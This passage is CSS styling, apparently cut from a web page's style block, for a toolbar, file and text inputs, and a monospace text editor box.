        .toolbar { background: #f8f9fa; padding: 15px; border-radius: 6px; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; border: 1px solid #e2e8f0; }
        input[type="file"], input[type="text"], textarea { padding: 8px; border: 1px solid #cbd5e0; border-radius: 4px; background: #fff; color: #333; }
        .editor-box { background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e0; margin-top: 15px; }
        .editor-textarea { width: 100%; height: 350px; font-family: monospace; box-sizing: border-box; margin-bottom: 10px; font-size: 14px; padding: 10px; }
